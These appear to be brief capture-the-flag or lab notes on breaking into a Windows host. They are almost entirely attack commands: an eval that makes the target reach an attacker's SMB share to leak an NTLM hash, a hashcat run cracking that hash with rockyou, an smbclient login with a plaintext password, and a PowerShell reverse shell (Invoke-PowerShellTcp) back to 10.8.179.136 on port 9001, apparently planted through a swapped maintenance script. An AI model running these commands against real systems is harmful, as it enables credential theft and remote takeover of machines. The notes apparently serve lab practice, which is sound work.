	eval "dofile('//10.8.179.136/share')" 0
	
- the share mentioned in the above command can be a random share name which doesnt exist

	hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force

	smbclient //10.10.84.7/Enterprise-Share -U enterprise-security --password sand_0873959498

- it is a powershell script named PurgeIrrelevantData_1826.ps1

	Invoke-PowerShellTcp -Reverse -IPAddress 10.8.179.136 -Port 9001
